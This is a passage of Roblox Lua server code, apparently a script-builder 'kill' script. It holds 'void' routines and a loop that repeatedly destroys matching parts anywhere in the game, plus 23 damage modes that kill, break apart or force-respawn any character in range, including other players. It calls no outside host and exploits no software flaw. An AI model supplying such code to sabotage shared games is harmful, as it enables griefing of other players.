						for i, v in pairs(v.isaSpecific) do
							if i == "Scale" then
								if
									v == Vector3.new(
										round(d.Scale.X, 0.25),
										round(d.Scale.Y, 0.25),
										round(d.Scale.Z, 0.25)
									)
								then
									match = false
								end
								break
							end
							if i == "Offset" then
								if
									v == Vector3.new(
										round(d.Offset.X, 0.25),
										round(d.Offset.Y, 0.25),
										round(d.Offset.Z, 0.25)
									)
								then
									match = false
								end
								match = false
								break
							end
							if d[i] == v then
								match = false
							end
							break
						end
						if match == false then
							for i, v in pairs(speshmeshVoidTable) do
								d[i] = v
							end
							table.insert(
								voidConnections,
								d.Changed:Connect(function(c)
									if speshmeshVoidTable[c] == nil then
										return
									end
									d[c] = speshmeshVoidTable[c]
								end)
							)
							return
						end
					end
					if v.method == 2 then
						local match = false
						for i, v in pairs(v.isaSpecific) do
							if i == "Scale" then
								if
									v == Vector3.new(
										round(d.Scale.X, 0.25),
										round(d.Scale.Y, 0.25),
										round(d.Scale.Z, 0.25)
									)
								then
									match = true
								end
								break
							end
							if i == "Offset" then
								if
									v == Vector3.new(
										round(d.Offset.X, 0.25),
										round(d.Offset.Y, 0.25),
										round(d.Offset.Z, 0.25)
									)
								then
									match = true
								end
								break
							end
							if d[i] == v then
								match = true
							end
							break
						end
						if match == true then
							for i, v in pairs(speshmeshVoidTable) do
								d[i] = v
							end
							table.insert(
								voidConnections,
								d.Changed:Connect(function(c)
									if speshmeshVoidTable[c] == nil then
										return
									end
									d[c] = speshmeshVoidTable[c]
								end)
							)
							return
						end
					end
					if v.method == 3 then
						for i, v in pairs(speshmeshVoidTable) do
							d[i] = v
						end
						table.insert(
							voidConnections,
							d.Changed:Connect(function(c)
								if speshmeshVoidTable[c] == nil then
									return
								end
								d[c] = speshmeshVoidTable[c]
							end)
						)
						return
					end
				end
			end
			local isSus = nil
			isSus = d.Changed:Connect(function()
				for i, v in pairs(voidedInstances) do
					if d:IsA(v.isa) == false then
						if v.method == 1 then
							local match = true
							for i, v in pairs(v.isaSpecific) do
								if i == "Scale" then
									if
										v == Vector3.new(
											round(d.Scale.X, 0.25),
											round(d.Scale.Y, 0.25),
											round(d.Scale.Z, 0.25)
										)
									then
										match = false
									end
									break
								end
								if i == "Offset" then
									if
										v == Vector3.new(
											round(d.Offset.X, 0.25),
											round(d.Offset.Y, 0.25),
											round(d.Offset.Z, 0.25)
										)
									then
										match = false
									end
									match = false
									break
								end
								if d[i] == v then
									match = false
								end
								break
							end
							if match == false then
								for i, v in pairs(speshmeshVoidTable) do
									d[i] = v
								end
								table.insert(
									voidConnections,
									d.Changed:Connect(function(c)
										if speshmeshVoidTable[c] == nil then
											return
										end
										d[c] = speshmeshVoidTable[c]
									end)
								)
								destroy(isSus)
								return
							end
						end
						if v.method == 2 then
							local match = false
							for i, v in pairs(v.isaSpecific) do
								if i == "Scale" then
									if
										v == Vector3.new(
											round(d.Scale.X, 0.25),
											round(d.Scale.Y, 0.25),
											round(d.Scale.Z, 0.25)
										)
									then
										match = true
									end
									break
								end
								if i == "Offset" then
									if
										v == Vector3.new(
											round(d.Offset.X, 0.25),
											round(d.Offset.Y, 0.25),
											round(d.Offset.Z, 0.25)
										)
									then
										match = true
									end
									break
								end
								if d[i] == v then
									match = true
								end
								break
							end
							if match == true then
								for i, v in pairs(speshmeshVoidTable) do
									d[i] = v
								end
								table.insert(
									voidConnections,
									d.Changed:Connect(function(c)
										if speshmeshVoidTable[c] == nil then
											return
										end
										d[c] = speshmeshVoidTable[c]
									end)
								)
								destroy(isSus)
								return
							end
						end
						if v.method == 3 then
							for i, v in pairs(speshmeshVoidTable) do
								d[i] = v
							end
							table.insert(
								voidConnections,
								d.Changed:Connect(function(c)
									if speshmeshVoidTable[c] == nil then
										return
									end
									d[c] = speshmeshVoidTable[c]
								end)
							)
							destroy(isSus)
							return
						end
					end
				end
			end)
		end
		if d:IsA("BasePart") == false then
			return
		end
		for i, v in pairs(voidedInstances) do
			if v.method == 1 then
				local match = true
				for i, v in pairs(v.isaSpecific) do
					if i == "Scale" then
						if
							v == Vector3.new(
								round(d.Scale.X, 0.25),
								round(d.Scale.Y, 0.25),
								round(d.Scale.Z, 0.25)
							)
						then
							match = false
						end
						break
					end
					if i == "Offset" then
						if
							v == Vector3.new(
								round(d.Offset.X, 0.25),
								round(d.Offset.Y, 0.25),
								round(d.Offset.Z, 0.25)
							)
						then
							match = false
						end
						match = false
						break
					end
					if d[i] == v then
						match = false
					end
					break
				end
				if match == false then
					for i, v in pairs(speshmeshVoidTable) do
						d[i] = v
					end
					table.insert(
						voidConnections,
						d.Changed:Connect(function(c)
							if speshmeshVoidTable[c] == nil then
								return
							end
							d[c] = speshmeshVoidTable[c]
						end)
					)
					return
				end
			end
			if v.method == 2 then
				local match = false
				for i, v in pairs(v.isaSpecific) do
					if i == "Scale" then
						if
							v == Vector3.new(
								round(d.Scale.X, 0.25),
								round(d.Scale.Y, 0.25),
								round(d.Scale.Z, 0.25)
							)
						then
							match = true
						end
						break
					end
					if i == "Offset" then
						if
							v == Vector3.new(
								round(d.Offset.X, 0.25),
								round(d.Offset.Y, 0.25),
								round(d.Offset.Z, 0.25)
							)
						then
							match = true
						end
						break
					end
					if d[i] == v then
						match = true
					end
					break
				end
				if match == true then
					for i, v in pairs(speshmeshVoidTable) do
						d[i] = v
					end
					table.insert(
						voidConnections,
						d.Changed:Connect(function(c)
							if speshmeshVoidTable[c] == nil then
								return
							end
							d[c] = speshmeshVoidTable[c]
						end)
					)
					return
				end
			end
			if v.method == 3 then
				for i, v in pairs(speshmeshVoidTable) do
					d[i] = v
				end
				table.insert(
					voidConnections,
					d.Changed:Connect(function(c)
						if speshmeshVoidTable[c] == nil then
							return
						end
						d[c] = speshmeshVoidTable[c]
					end)
				)
				return
			end
		end
	end)
end)
local function DestroyPartsOfTable(thefunnipart)
	local runny = game:GetService("RunService")
	local classname = thefunnipart.ClassName
	local cancollide = thefunnipart.CanCollide
	local canquery = thefunnipart.CanQuery
	local cantouch = thefunnipart.CanTouch
	local materialprop = thefunnipart.Material
	local colorprop = thefunnipart.Color
	for _, mh in pairs({ runny.Stepped, runny.Heartbeat, runny.PostSimulation, runny.PreSimulation, runny.PreAnimation }) do
		mh:Connect(function()
			for _, theparts in pairs(game:GetDescendants()) do
				if
					theparts.ClassName == classname
					and theparts.CanCollide == cancollide
					and theparts.CanQuery == canquery
					and theparts.CanTouch == cantouch
					and theparts.Color == colorprop
					and theparts.Material == materialprop
				then
					pcall(function()
						theparts:Destroy()
						theparts.Changed:Connect(function()
							theparts:Destroy()
						end)
						theparts.Destroying:Connect(function()
							theparts:Destroy()
						end)
						theparts.DescendantAdded:Connect(function()
							theparts:Destroy()
						end)
						task.defer(game.Destroy, theparts)
					end)
				end
			end
		end)
	end
end
local function killPart(i, ins)
	for i, v in pairs(i:GetJoints()) do
		v.Enabled = false
	end
	if ins then
		i.CanCollide = false
		i.Anchored = true
		i.LocalTransparencyModifier = 1
		return
	end
end
local function killGui(i, ins, msg)
	if ins then
		destroy(i)
		return
	end
	if i:IsA("TextLabel") or i:IsA("TextButton") or i:IsA("TextBox") then
		if msg then
			i.Text = msg
		end
		i.BackgroundTransparency = 1
		i.Transparency = 1
		return
	end
	if i:IsA("ImageButton") or i:IsA("ImageLabel") or i:IsA("ViewportFrame") then
		i.BackgroundTransparency = 1
		i.Transparency = 1
		return
	end
end
local function killDecal(i, ins)
	if ins then
		i.Visible = false
		i.LocalTransparencyModifier = 1
		return
	end
end
local function killSound(i)
	i.SoundGroup = nil
	destroy(i, 2)
end
local function voidInstance(i, method, keepOut)
	if i:IsA("LuaSourceContainer") then
		game:GetService("Debris"):AddItem(i, 0)
		return
	end
	if i:IsA("BasePart") then
		local infoTable = {
			method = method,
			isa = "BasePart",
			ClassName = i.ClassName,
			isaSpecific = {
				Material = i.Material,
				Size = Vector3.new(round(i.Size.X, 0.25), round(i.Size.Y, 0.25), round(i.Size.Z, 0.25)),
				Color = Color3.new(round(i.Color.R, 0.01), round(i.Color.G, 0.01), round(i.Color.B, 0.01)),
			},
			classSpecific = {},
		}
		if i:IsA("MeshPart") then
			infoTable.classSpecific.MeshId = i.MeshId
			infoTable.classSpecific.TextureID = i.TextureID
			infoTable.classSpecific.DoubleSided = i.DoubleSided
		end
		if i:IsA("Part") then
			infoTable.classSpecific.Shape = i.Shape
		end
		local e = i.Changed:Connect(function(c)
			if voidTable[c] == nil then
				return
			end
			if i[c] == voidTable[c] then
				return
			end
			i[c] = voidTable[c]
		end)
		if keepOut ~= true then
			table.insert(voidedInstances, infoTable)
			table.insert(voidConnections, e)
		end
		for k, v in pairs(voidTable) do
			i[k] = v
		end
		return
	end
	if i:IsA("SpecialMesh") then
		local infoTable = {
			method = method,
			isa = "SpecialMesh",
			ClassName = "SpecialMesh",
			isaSpecific = {
				MeshId = i.MeshId,
				Scale = Vector3.new(round(i.Scale.X, 0.25), round(i.Scale.Y, 0.25), round(i.Scale.Z, 0.25)),
				Offset = Vector3.new(round(i.Offset.X, 0.25), round(i.Offset.Y, 0.25), round(i.Offset.Z, 0.25)),
			},
			classSpecific = {},
		}
		local e = i.Changed:Connect(function(c)
			if speshmeshVoidTable[c] == nil then
				return
			end
			if i[c] == speshmeshVoidTable[c] then
				return
			end
			i[c] = speshmeshVoidTable[c]
		end)
		if keepOut ~= true then
			table.insert(voidedInstances, infoTable)
			table.insert(voidConnections, e)
		end
		for k, v in pairs(speshmeshVoidTable) do
			i[k] = v
		end
	end
	if i:IsA("BlockMesh") or i:IsA("CylinderMesh") then
		local infoTable = {
			method = method,
			isa = "BlockMesh",
			ClassName = "BlockMesh",
			isaSpecific = {
				Scale = Vector3.new(round(i.Scale.X, 0.25), round(i.Scale.Y, 0.25), round(i.Scale.Z, 0.25)),
				Offset = Vector3.new(round(i.Offset.X, 0.25), round(i.Offset.Y, 0.25), round(i.Offset.Z, 0.25)),
			},
			classSpecific = {},
		}
		local e = i.Changed:Connect(function(c)
			if speshmeshVoidTable[c] == nil then
				return
			end
			if i[c] == speshmeshVoidTable[c] then
				return
			end
			i[c] = speshmeshVoidTable[c]
		end)
		if keepOut ~= true then
			table.insert(voidedInstances, infoTable)
			table.insert(voidConnections, e)
		end
		for k, v in pairs(speshmeshVoidTable) do
			i[k] = v
		end
	end
end
local function killInstance(e)
	if e:IsA("BasePart") then
		killPart(e)
	end
	if e:IsA("Sound") then
		killSound(e)
	end
	if e:IsA("Decal") then
		killDecal(e)
	end
	if e:IsA("GuiObject") then
		killGui(e)
	end
	if e:IsA("Humanoid") then
		e.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
	end
end
local MONEY_PREVIOUS = MONEYOBJECT.Value
local MONEYCHANGING = false
MONEYOBJECT.Changed:Connect(function()
	if MONEYCHANGING == true then
		return
	end
	MONEYCHANGING = true
	local Change = MONEYOBJECT.Value - MONEY_PREVIOUS
	coroutine.resume(coroutine.create(function()
		local Timer = 2
		repeat
			wait(1)
			Timer = Timer - 1
			MONEYOBJECT.Changed:Connect(function()
				Timer = 2
			end)
		until Timer <= 0
		MONEYCHANGING = false
	end))
	repeat
		Change = MONEYOBJECT.Value - MONEY_PREVIOUS
		wait()
	until MONEYCHANGING == false
	if Change >= 0 and Change < 1e3 then
		Remote:FireAllClients(
			"MakeText",
			{ Text = "Gained $" .. string.format("%.2f", tostring(math.floor(Change * 100 + 0.5) / 100)), ClientSide = false }
		)
	elseif Change >= 1e3 and Change < 1e6 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e3 * 100 + 0.5) / 100))
					.. " thousand",
				ClientSide = false,
			}
		)
	elseif Change >= 1e6 and Change < 1e9 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e6 * 100 + 0.5) / 100))
					.. " million",
				ClientSide = false,
			}
		)
	elseif Change >= 1e9 and Change < 1e12 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e9 * 100 + 0.5) / 100))
					.. " billion",
				ClientSide = false,
			}
		)
	elseif Change >= 1e12 and Change < 1e15 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e12 * 100 + 0.5) / 100))
					.. " trillion",
				ClientSide = false,
			}
		)
	elseif Change >= 1e15 and Change < 1e18 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e15 * 100 + 0.5) / 100))
					.. " quadrillion",
				ClientSide = false,
			}
		)
	elseif Change >= 1e18 and Change < 1e21 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e18 * 100 + 0.5) / 100))
					.. " quintillon",
				ClientSide = false,
			}
		)
	elseif Change >= 1e21 and Change < 1e24 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e21 * 100 + 0.5) / 100))
					.. " sextillion",
				ClientSide = false,
			}
		)
	elseif Change >= 1e24 and Change < 1e27 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e24 * 100 + 0.5) / 100))
					.. " septillion",
				ClientSide = false,
			}
		)
	elseif Change >= 1e27 and Change < 1e30 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e27 * 100 + 0.5) / 100))
					.. " octillion",
				ClientSide = false,
			}
		)
	elseif Change >= 1e30 and Change < 1e33 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e30 * 100 + 0.5) / 100))
					.. " nonillion",
				ClientSide = false,
			}
		)
	elseif Change >= 1e33 and Change < 1e36 then
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Gained $"
					.. string.format("%.2f", tostring(math.floor(Change / 1e33 * 100 + 0.5) / 100))
					.. " decillion",
				ClientSide = false,
			}
		)
	end
	MONEY_PREVIOUS = MONEYOBJECT.Value
end)
local damagetypenum = 1
function changedamagetypemode()
	if damagetypenum == 1 then
		DamageType = "Damage"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Damage'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 2 then
		DamageType = "Inf Damage"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Inf Damage'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 3 then
		DamageType = "Set Health"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Set Health'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 4 then
		DamageType = "BreakJoints"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'BreakJoints Player'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 5 then
		DamageType = "Combined Kill"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Combined Kill'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 6 then
		DamageType = "Destroy Humanoid"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Destroy Humanoid'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 7 then
		DamageType = "Respawn"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Humanoid Respawn'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 8 then
		DamageType = "Plr Respawn"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Player Respawn'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 9 then
		DamageType = "Find Respawn"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Find By Name/UserId Respawn'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 10 then
		DamageType = "BreakJoints 2"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'BreakJoints Model'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 11 then
		DamageType = "Destroy"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Destroy'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 12 then
		DamageType = "Destroy Tables"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Destroy Tables'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 13 then
		DamageType = "Ray"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Void 1'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 14 then
		DamageType = "Distance"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Void 2'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 15 then
		DamageType = "Strong Void"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Better Void'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 16 then
		DamageType = "Banish"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Banish'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 17 then
		DamageType = "Other Void Method 1"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Banish Tables'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 18 then
		DamageType = "Other Void Method 2"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Ultra Banish'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 19 then
		DamageType = "Other Void Method 3"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Ultra Void'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 20 then
		DamageType = "Fly RealChar Void"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Mega Void'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 21 then
		DamageType = "Better Destroy"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Better Destroy'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 22 then
		DamageType = "Derender"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Derender'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	elseif damagetypenum == 23 then
		DamageType = "Force Lock"
		Remote:FireAllClients(
			"MakeText",
			{ Text = "DamageType Changed to 'Force Lock'", Color = Enum.ChatColor.Blue, ClientSide = false }
		)
	end
end
function RemoteFunc(plr, typ, thing)
	if plr == Player then
		LastCall = tick()
		if typ == "Character" then
			Remote:FireAllClients(
				"Character",
				{
					Pos = thing.Pos,
					PosRot = thing.PosRot,
					SoundId = SoundId,
					ThemeVolume = ThemeVolume,
					PlaybackSpeed = PlaybackSpeed,
					KillSound = KillSound,
					Sine = thing.Sine,
					Mode = thing.Mode,
					Moving = thing.Moving,
					Falling = thing.Falling,
					Fall = thing.Fall,
					Flying = thing.Flying,
					TouchingFloor = thing.TouchingFloor,
					HumanoidMode = thing.HumanoidMode,
					HipHeight = thing.HipHeight,
					MousePos = thing.MousePos,
					VisEnabled = thing.VisEnabled,
					UseAnim = thing.UseAnim,
					Animation = thing.Animation,
					CameraShakes = thing.CameraShakes,
					CannonOnBack = thing.CannonOnBack,
					LookAtCamera = thing.LookAtCamera,
					CameraCFrame = thing.CameraCFrame,
					CameraAngles = thing.CameraAngles,
					VisSkin = VisSkin,
					Damage = Damage,
					DamageType = DamageType,
					KillType = KillType,
					ShieldEnabled = ShieldEnabled,
					CustomColorBoolean = CustomColorBoolean,
					CustomColor = CustomColor,
					CustomColor2 = CustomColor2,
					KillEffect = KillEffect,
				}
			)
			MousePos, TerrainTool, MouseHold = thing.MousePos, thing.TerrainTool, thing.MouseHold
			if TerrainTool == true and MouseHold == true then
				TerrainFunc(MousePos)
			end
		elseif typ == "Function" then
			Remote:FireAllClients("Function", thing)
		elseif typ == "UpdateMoney" then
			MONEYOBJECT.Value = MONEYOBJECT.Value + thing.AddedMoney * MONEYMULTIPLIER
		elseif typ == "ShieldEnabled" then
			ShieldEnabled = not ShieldEnabled
			if ShieldEnabled == true then
				Remote:FireAllClients("ShieldSound", { Type = 1 })
			elseif ShieldEnabled == false then
				Remote:FireAllClients("ShieldSound", { Type = 2 })
			end
		elseif typ == "KillType" then
			if KillType == "Server" then
				KillType = "Client"
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Changed to Client Kill", Color = Enum.ChatColor.Green, ClientSide = true }
				)
			elseif KillType == "Client" then
				KillType = "Server"
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Changed to Server Kill", Color = Enum.ChatColor.Green, ClientSide = true }
				)
			else
				KillType = "Server"
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Changed to Server Kill", Color = Enum.ChatColor.Green, ClientSide = true }
				)
			end
		elseif typ == "DamageType" then
			if thing.Forward == true then
				local LastMode = damagetypenum
				damagetypenum = math.clamp(damagetypenum + 1, 1, 23)
				if damagetypenum == LastMode then
				else
					changedamagetypemode()
				end
			else
				local LastMode = damagetypenum
				damagetypenum = math.clamp(damagetypenum - 1, 1, 23)
				if damagetypenum == LastMode then
				else
					changedamagetypemode()
				end
			end
		elseif typ == "DamageBoolean" then
			Damage = not Damage
			if Damage == true then
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Damage Changed to true", Color = Enum.ChatColor.Green, ClientSide = true }
				)
			elseif Damage == false then
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Damage Changed to false", Color = Enum.ChatColor.Green, ClientSide = true }
				)
			end
		elseif typ == "TPEffect" then
			Remote:FireAllClients("TPEffect", { Start = thing.Start, End = thing.End })
		elseif typ == "Kill" then
			if KillType == "Server" and Damage == true then
				local pos, range, parts, killeffects, ignore = thing.Pos, thing.Range, {}, {}, { workspace["Terrain"] }
				if DamageType == "Damage" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("Humanoid")
							and (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild("Head", true) or v.Parent.Parent.Parent:FindFirstChild(
								"Head",
								true
								))
								and ((
									v.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent.Parent:FindFirstChild("Head", true)
									).Position - pos).Magnitude <= range * 0.5
								and not table.find(ignore, v)
						then
							v.Health = v.Health - 20
							local Tabl = {
								Pos = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).CFrame,
								Size = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).Size,
							}
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Inf Damage" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("Humanoid")
							and (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild("Head", true) or v.Parent.Parent.Parent:FindFirstChild(
								"Head",
								true
								))
								and ((
									v.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent.Parent:FindFirstChild("Head", true)
									).Position - pos).Magnitude <= range * 0.5
								and not table.find(ignore, v)
						then
							v.Health = v.Health - math.huge
							local Tabl = {
								Pos = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).CFrame,
								Size = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).Size,
							}
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Set Health" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("Humanoid")
							and (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild("Head", true) or v.Parent.Parent.Parent:FindFirstChild(
								"Head",
								true
								))
								and ((
									v.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent.Parent:FindFirstChild("Head", true)
									).Position - pos).Magnitude <= range * 0.5
								and not table.find(ignore, v)
						then
							v.Health = 0
							local Tabl = {
								Pos = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).CFrame,
								Size = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).Size,
							}
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "BreakJoints" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("Humanoid")
							and (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild("Head", true) or v.Parent.Parent.Parent:FindFirstChild(
								"Head",
								true
								))
								and ((
									v.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent.Parent:FindFirstChild("Head", true)
									).Position - pos).Magnitude <= range * 0.5
								and not table.find(ignore, v)
						then
							v.Parent:BreakJoints()
							local Tabl = {
								Pos = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).CFrame,
								Size = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).Size,
							}
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Combined Kill" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("Humanoid")
							and (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild("Head", true) or v.Parent.Parent.Parent:FindFirstChild(
								"Head",
								true
								))
								and ((
									v.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent.Parent:FindFirstChild("Head", true)
									).Position - pos).Magnitude <= range * 0.5
								and not table.find(ignore, v)
						then
							pcall(function()
								v.Health = v.Health - math.huge
								v.Health = 0
								v.Parent:BreakJoints()
							end)
							local Tabl = {
								Pos = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).CFrame,
								Size = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).Size,
							}
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Destroy Humanoid" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("Humanoid")
							and (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild("Head", true) or v.Parent.Parent.Parent:FindFirstChild(
								"Head",
								true
								))
								and ((
									v.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent.Parent:FindFirstChild("Head", true)
									).Position - pos).Magnitude <= range * 0.5
								and not table.find(ignore, v)
						then
							v:Destroy()
							local Tabl = {
								Pos = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).CFrame,
								Size = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).Size,
							}
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Respawn" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("Humanoid")
							and (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild("Head", true) or v.Parent.Parent.Parent:FindFirstChild(
								"Head",
								true
								))
								and ((
									v.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent.Parent:FindFirstChild("Head", true)
									).Position - pos).Magnitude <= range * 0.5
								and not table.find(ignore, v)
						then
							if
								game:GetService("Players")
								:GetPlayerFromCharacter(v.Parent or v.Parent.Parent or v.Parent.Parent.Parent)
							then
								game:GetService("Players")
									:GetPlayerFromCharacter(v.Parent or v.Parent.Parent or v.Parent.Parent.Parent)
									:LoadCharacter()
							end
							local Tabl = {
								Pos = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).CFrame,
								Size = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									) or v.Parent.Parent.Parent:FindFirstChild("Head", true)).Size,
							}
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Plr Respawn" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("BasePart")
							and game:GetService("Players")
